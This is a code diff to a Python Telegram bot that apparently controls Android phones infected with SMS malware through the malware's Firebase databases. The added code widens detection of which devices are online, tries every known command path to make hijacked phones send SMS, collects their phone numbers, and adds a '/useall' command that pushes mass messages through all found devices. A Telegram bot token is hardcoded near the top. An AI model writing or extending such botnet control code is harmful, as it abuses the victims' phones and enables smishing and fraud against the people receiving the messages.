@@ -34,7 +34,8 @@ import requests
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8763280422:AAFwSQvwIgSrgqBsGJTZmjGFe0kKlvHVD_o")
 ALLOWED_USERS: set[int] = set()  # empty = everyone
 SMS_PER_DEVICE = 5
-ONLINE_WINDOW_MS = 5 * 60 * 1000
+# Match 2.py: 15 min freshness window for lastSeen / heartbeat
+ONLINE_WINDOW_MS = 15 * 60 * 1000
 JOB_DELAY_SEC = 1.2
 PROGRESS_EDIT_EVERY = 3
 HTTP_TIMEOUT = 25
@@ -180,65 +181,106 @@ def parse_timestamp(val) -> Optional[int]:
     return None
 
 def is_device_online(node: dict) -> tuple[bool, Optional[int]]:
+    """
+    Broad online detection aligned with 2.py + NEXUS:
+    - isOnline / online / connected truthy
+    - status: True | 1 | "online" | "active" | "alive" | "on" | "connected"
+    - lastOnlineAt / lastSeen / updatedAt / timestamp within ONLINE_WINDOW_MS (15m)
+    - heartbeat dict or scalar timestamp
+    Also walks nested info/status objects used by some APKs.
+    """
     if not isinstance(node, dict):
         return False, None
 
+    now_ms = int(time.time() * 1000)
     info = node.get("info") if isinstance(node.get("info"), dict) else {}
-    st = node.get("status") if isinstance(node.get("status"), dict) else {}
-    if not st and isinstance(info.get("status"), dict):
-        st = info["status"]
+    st_obj = node.get("status") if isinstance(node.get("status"), dict) else {}
+    if not st_obj and isinstance(info.get("status"), dict):
+        st_obj = info["status"]
 
-    last_seen = parse_timestamp(
-        node.get("lastSeen") or node.get("last_seen") or node.get("lastOnline")
-        or node.get("last_online") or node.get("lastActive") or node.get("last_active")
-        or node.get("joined") or node.get("updatedAt") or node.get("updated_at")
-        or node.get("timestamp") or node.get("time") or node.get("dateTime")
-        or node.get("lastMessageTime")
-        or info.get("lastSeen") or info.get("last_seen") or info.get("lastOnline")
-        or info.get("joined") or st.get("lastSeen")
+    # Collect best last-seen style timestamp for reporting + freshness
+    ts_keys = (
+        "lastOnlineAt", "last_seen", "lastSeen", "lastSeenAt",
+        "lastOnline", "last_online", "lastActive", "last_active",
+        "updatedAt", "updated_at", "last_update", "lastUpdate",
+        "timestamp", "ts", "time", "dateTime", "lastMessageTime",
+        "last_heartbeat", "lastHeartbeat", "joined",
     )
+    last_seen = None
+    for src in (node, info, st_obj):
+        if not isinstance(src, dict):
+            continue
+        for k in ts_keys:
+            t = parse_timestamp(src.get(k))
+            if t is not None and (last_seen is None or t > last_seen):
+                last_seen = t
 
-    online = False
-    raw = node.get("status") if not isinstance(node.get("status"), dict) else None
-    if raw is None:
-        raw = info.get("status") if not isinstance(info.get("status"), dict) else None
-    if raw is None:
-        raw = st.get("status") if isinstance(st, dict) else None
+    # heartbeat nested
+    hb = node.get("heartbeat")
+    if isinstance(hb, dict):
+        for k in ("timestamp", "ts", "time", "lastSeen", "updatedAt"):
+            t = parse_timestamp(hb.get(k))
+            if t is not None and (last_seen is None or t > last_seen):
+                last_seen = t
+    else:
+        t = parse_timestamp(hb)
+        if t is not None and (last_seen is None or t > last_seen):
+            last_seen = t
+
+    # ── boolean / flag fields (2.py style: truthy, not only `is True`) ──
+    for src in (node, info, st_obj):
+        if not isinstance(src, dict):
+            continue
+        if src.get("isOnline") or src.get("online") or src.get("connected") or src.get("alive"):
+            return True, last_seen
+
+    # ── status field ──
+    raw = None
+    if not isinstance(node.get("status"), dict):
+        raw = node.get("status")
+    if raw is None and not isinstance(info.get("status"), dict):
+        raw = info.get("status")
+    if raw is None and isinstance(st_obj, dict):
+        raw = st_obj.get("status")
     if raw is None:
         raw = node.get("state") or info.get("state")
 
-    if raw is False or raw == 0 or raw is None:
-        online = False
-    elif isinstance(raw, str):
+    if raw is True or raw == 1:
+        return True, last_seen
+    if isinstance(raw, str):
         sl = raw.lower().strip()
-        online = sl not in ("false", "0", "no", "offline", "inactive", "disconnected", "dead", "gone") and len(sl) > 0
-    elif isinstance(raw, dict):
-        online = bool(
-            raw.get("online") or raw.get("isOnline") or raw.get("connected")
-            or raw.get("active") or raw.get("alive")
-        )
-    else:
-        online = bool(raw)
+        if sl in ("online", "active", "alive", "on", "true", "1", "connected"):
+            return True, last_seen
+        # non-empty string that is not an explicit offline word → treat online (NEXUS)
+        if sl and sl not in ("false", "0", "no", "offline", "inactive", "disconnected", "dead", "gone"):
+            return True, last_seen
+    if isinstance(raw, (int, float)) and raw != 0:
+        return True, last_seen
+    if isinstance(raw, dict):
+        if raw.get("online") or raw.get("isOnline") or raw.get("connected") or raw.get("active") or raw.get("alive"):
+            return True, last_seen
 
-    if not online and (node.get("online") is True or info.get("online") is True
-                       or node.get("isOnline") is True or info.get("isOnline") is True):
-        online = True
-    if not online and isinstance(node.get("connected"), bool):
-        online = node["connected"]
-    if not online and isinstance(info.get("connected"), bool):
-        online = info["connected"]
-    if not online and (node.get("alive") is True or info.get("alive") is True or node.get("heartbeat") is True):
-        online = True
-    if not online and last_seen and (int(time.time() * 1000) - last_seen) < ONLINE_WINDOW_MS:
-        online = True
+    # ── heartbeat status string ──
+    if isinstance(hb, dict):
+        hb_st = str(hb.get("status") or "").lower()
+        if hb_st in ("alive", "online", "active"):
+            return True, last_seen
 
-    return online, last_seen
+    # ── timestamp freshness (15 min window, allow small clock skew) ──
+    if last_seen is not None:
+        delta = now_ms - last_seen
+        if -60_000 < delta < ONLINE_WINDOW_MS:
+            return True, last_seen
+
+    return False, last_seen
 
 def extract_phone(node: dict) -> str:
     info = node.get("info") if isinstance(node.get("info"), dict) else {}
     candidates = [
-        node.get("mobNo"), info.get("mobNo"), node.get("phone"), node.get("phoneNumber"),
-        info.get("phone"), node.get("number"), info.get("phoneNumber"),
+        node.get("mobNo"), info.get("mobNo"),
+        node.get("phone"), node.get("phoneNumber"), node.get("phone_number"),
+        info.get("phone"), info.get("phoneNumber"),
+        node.get("mobile"), node.get("number"), info.get("phoneNumber"),
         node.get("msisdn"), info.get("msisdn"),
     ]
     for c in candidates:
@@ -247,11 +289,11 @@ def extract_phone(node: dict) -> str:
         dig = re.sub(r"[^\d+]", "", str(c))
         if len(dig) >= 10:
             return dig
-    sims = node.get("sims") or info.get("sims") or []
+    sims = node.get("sims") or info.get("sims") or node.get("simInfo") or []
     if isinstance(sims, list):
         for s in sims:
             if isinstance(s, dict):
-                p = s.get("phoneNumber") or s.get("number")
+                p = s.get("phoneNumber") or s.get("number") or s.get("msisdn")
                 if p and str(p) != "Unknown":
                     dig = re.sub(r"[^\d+]", "", str(p))
                     if len(dig) >= 10:
@@ -264,41 +306,136 @@ def project_label(db_url: str) -> str:
     m = re.search(r"https?://([^.]+)", u, re.I)
     return m.group(1) if m else u[:40]
 
+def _merge_device_maps(*maps: dict) -> dict:
+    """clients wins on conflicts (2.py order: clients first, then devices)."""
+    merged: dict = {}
+    for blob in maps:
+        if not isinstance(blob, dict):
+            continue
+        for did, data in blob.items():
+            if data is None or not isinstance(data, dict):
+                continue
+            did_s = str(did)
+            if did_s.startswith(".") or did_s in ("webhookEvent", "actions", "config"):
+                continue
+            if did_s in merged:
+                base = dict(merged[did_s])
+                base.update({k: v for k, v in data.items() if v is not None})
+                merged[did_s] = base
+            else:
+                merged[did_s] = data
+    return merged
+
 def scan_devices(db_url: str, secret: str = "") -> list[dict]:
+    """
+    Fetch clients/ + devices/ (2.py order) and mark online with broad heuristics.
+    """
     out = []
     try:
-        snap = fb_get(db_url, "devices", secret)
-        if not snap or not isinstance(snap, dict):
-            return out
-        for did, node in snap.items():
-            if not isinstance(node, dict):
-                continue
+        clients = None
+        devices = None
+        # Prefer clients (working APK path), then devices
+        try:
+            clients = fb_get(db_url, "clients", secret)
+        except Exception as e:
+            log.info("clients path miss %s: %s", db_url, e)
+        try:
+            devices = fb_get(db_url, "devices", secret)
+        except Exception as e:
+            log.info("devices path miss %s: %s", db_url, e)
+
+        # If both failed hard, surface the devices error (or clients)
+        if clients is None and devices is None:
+            # one more try on root devices-only for error message
+            snap = fb_get(db_url, "devices", secret)
+            devices = snap
+
+        merged = _merge_device_maps(
+            clients if isinstance(clients, dict) else {},
+            devices if isinstance(devices, dict) else {},
+        )
+        for did, node in merged.items():
             online, last_seen = is_device_online(node)
             phone = extract_phone(node)
+            model = (
+                node.get("deviceModel") or node.get("modelName") or node.get("model")
+                or node.get("phone_model") or node.get("device_name") or node.get("name")
+                or ""
+            )
             out.append({
-                "id": did,
+                "id": str(did),
                 "online": online,
                 "lastSeen": last_seen,
                 "phone": phone,
+                "model": str(model).strip() if model else "",
+                "source": "clients+devices",
             })
+        log.info(
+            "scan %s → total=%d online=%d",
+            project_label(db_url),
+            len(out),
+            sum(1 for d in out if d["online"]),
+        )
     except Exception as e:
         log.warning("scan devices failed for %s: %s", db_url, e)
         raise
     return out
 
 def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, chat_id: int) -> str:
+    """
+    Write SMS job using 2.py path order first, then NEXUS-style sendSms queue.
+    APKs listen on different nodes — try until one write succeeds.
+    """
     job_id = str(uuid.uuid4())[:12]
-    job = {
-        "to": to,
-        "body": body,
+    now_ms = int(time.time() * 1000)
+    sim = 0  # 2.py uses 0-based sim index
+
+    # 2.py simple payload (webhookEvent/sendSms)
+    payload_simple = {
+        "from": sim,
+        "to": to.strip(),
+        "message": body.strip(),
+        "isSended": False,
+    }
+    # 2.py cmd-style payload
+    payload_cmd = {
+        "cmdId": now_ms,
+        "from": sim,
+        "to": to.strip(),
+        "message": body.strip(),
+        "isSended": False,
+        "sendOk": False,
+    }
+    # NEXUS / AndroidSmsListener queue shape
+    payload_nexus = {
+        "to": to.strip(),
+        "body": body.strip(),
         "status": "pending",
-        "createdAt": int(time.time() * 1000),
+        "createdAt": now_ms,
         "requestedBy": chat_id,
         "sim": 1,
     }
-    path = f"devices/{device_id}/sendSms/{job_id}"
-    fb_put(db_url, path, job, secret)
-    return job_id
+
+    attempts = [
+        (f"clients/{device_id}/webhookEvent/sendSms", payload_simple),
+        (f"devices/{device_id}/webhookEvent/sendSms", payload_simple),
+        (f"devices/{device_id}/actions/sendSms", payload_cmd),
+        (f"clients/{device_id}/actions/sendSms", payload_cmd),
+        (f"devices/{device_id}/sendSms/{job_id}", payload_nexus),
+        (f"clients/{device_id}/sendSms/{job_id}", payload_nexus),
+    ]
+
+    last_err = None
+    for path, payload in attempts:
+        try:
+            fb_put(db_url, path, payload, secret)
+            log.info("SMS job OK via %s → %s", path, to)
+            return job_id
+        except Exception as e:
+            last_err = e
+            log.debug("path fail %s: %s", path, e)
+            continue
+    raise RuntimeError(f"all send paths failed: {last_err}")
 
 # ── PARSE INPUT FILES ─────────────────────────────────────────────────────
 def parse_firebase_urls(text: str) -> list[tuple[str, str]]:
@@ -524,6 +661,36 @@ def cmd_status(message: types.Message):
             f"Numbers loaded: {len(s.numbers)}"
         )
 
+@bot.message_handler(commands=["useall"])
+def cmd_useall(message: types.Message):
+    """Treat every found device (online+offline) as a sender — for APKs that never write presence."""
+    if not is_allowed(message.from_user.id):
+        return
+    s = get_session(message.chat.id)
+    if not s.projects:
+        bot.reply_to(message, "No projects loaded. /start and upload Firebase URLs first.")
+        return
+    all_devs = []
+    for pi, p in enumerate(s.projects):
+        for d in p.devices:
+            all_devs.append({
+                "project_idx": pi,
+                "id": d["id"],
+                "phone": d.get("phone") or "—",
+                "lastSeen": d.get("lastSeen"),
+                "project": p.name,
+            })
+    if not all_devs:
+        bot.reply_to(message, "No device nodes under clients/ or devices/ on any project.")
+        return
+    s.online_devices = all_devs
+    s.step = "await_numbers"
+    bot.reply_to(
+        message,
+        f"✅ Using <b>{len(all_devs)}</b> device(s) as senders (online check skipped).\n\n"
+        f"<b>Step 2 — send recipient numbers .txt now</b>"
+    )
+
 @bot.message_handler(content_types=["document"])
 def on_document(message: types.Message):
     if not is_allowed(message.from_user.id):
@@ -599,12 +766,24 @@ def on_document(message: types.Message):
             lines.append("\n<b>Step 2 — send recipient numbers .txt now</b>")
             s.step = "await_numbers"
         else:
+            # Show sample offline nodes so user can verify data is loading
+            samples = []
+            for p in projects:
+                for d in p.devices[:3]:
+                    ls = d.get("lastSeen")
+                    ls_s = str(ls) if ls else "—"
+                    samples.append(f"  · {p.name}/{d['id']} phone={d.get('phone')} lastSeen={ls_s}")
+                if len(samples) >= 12:
+                    break
             lines.append(
-                "\n⚠️ No online devices found.\n"
-                "• Check URL is correct\n"
-                "• If rules require auth, use <code>URL|DATABASE_SECRET</code>\n"
-                "• Device must have recent lastSeen / online status"
+                "\n⚠️ No online devices (15m window).\n"
+                "Scanned <code>clients/</code> + <code>devices/</code>.\n"
+                "• If rules need auth: <code>URL|DATABASE_SECRET</code>\n"
+                "• Or reply <code>/useall</code> to treat all found devices as senders"
             )
+            if samples:
+                lines.append("\n<b>Sample nodes seen:</b>")
+                lines.extend(samples[:12])
             s.step = "await_firebase"
         bot.reply_to(message, "\n".join(lines))
         return
@@ -680,7 +859,20 @@ def on_text(message: types.Message):
                 lines.append("\n<b>Step 2 — send recipient numbers .txt</b>")
                 s.step = "await_numbers"
             else:
-                lines.append("\n⚠️ No online devices. Check URL / secret / presence.")
+                samples = []
+                for p in projects:
+                    for d in p.devices[:3]:
+                        samples.append(f"  · {p.name}/{d['id']} phone={d.get('phone')}")
+                    if len(samples) >= 12:
+                        break
+                lines.append(
+                    "\n⚠️ No online devices (15m window).\n"
+                    "Scanned clients/ + devices/.\n"
+                    "Reply <code>/useall</code> to use all found devices."
+                )
+                if samples:
+                    lines.append("\n<b>Sample nodes:</b>")
+                    lines.extend(samples[:12])
                 s.step = "await_firebase"
             bot.reply_to(message, "\n".join(lines))
             return
